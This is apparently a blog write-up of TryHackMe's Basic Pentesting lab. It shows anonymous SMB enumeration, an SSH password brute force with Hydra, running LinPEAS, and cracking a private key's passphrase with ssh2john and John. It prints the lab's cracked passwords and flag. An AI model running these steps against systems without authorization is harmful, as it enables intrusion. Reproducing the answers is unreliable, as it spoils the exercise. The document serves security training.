---
date: '2025-02-01T23:03:55+05:30'
draft: false
title: 'Basic Pentesting: TryHackMe Walkthrough'
slug: basic-pentesting-thm
tags: ["tryhackme", "ctf", "pentesting", "linux", "ssh", "smb"]
category: writeups
showtoc: true
summary: A walkthrough of TryHackMe's Basic Pentesting room covering web application testing, SMB enumeration, and SSH key-based privilege escalation
description: Complete guide for TryHackMe's Basic Pentesting challenge demonstrating SMB enumeration, password cracking, and SSH private key exploitation
---

# Basic Pentesting: THM Walkthrough

## Initial Reconnaissance

- Server running Apache/2.4.18 (Ubuntu)
- SMB version 2.5.12 identified
- Development path containing text files discovered
- Two users identified: Jan and Kay

## SMB Enumeration

Anonymous login was enabled by default on the SMB shares. Used the following methods for enumeration:

1. Direct SMB connection:
```bash
smbclient //ip/anonymous
```

2. Enhanced enumeration using enum4linux (recommended for better results)

## User Access - Jan

Successfully brute-forced Jan's password using Hydra, resulting in SSH access:

```bash
[22][ssh] host: 10.10.237.90 login: jan password: armando
```

### File Transfer Tip
When encountering permission errors during SCP file transfers, use the `/dev/shm` path on the remote host:

```bash
scp linpeas.sh remote-user@remote-ip:/dev/shm
```

## Privilege Escalation to Kay

1. Ran LinPEAS on Jan's account which revealed Kay's exposed private key

2. Attempted to use Kay's private key for SSH access:
```bash
ssh -i id_rsa_kay user@ip
```

3. Encountered passphrase protection on the key

4. Cracked the passphrase using ssh2john:
```bash
ssh2john id_rsa_kay > hash.txt
john hash.txt --wordlist=/path/of/rockyou --format=SSH
```

5. Retrieved passphrase: `beeswax`

## Flag

Successfully accessed Kay's account and viewed pass.bak containing the flag:
```
heresareallystrongpasswordthatfollowsthepasswordpolicy
```

## Key Findings

1. Weak password policy for Jan's account
2. Exposed SSH private key for Kay's account
3. Misconfigured SMB with anonymous access
4. Sensitive files in development path
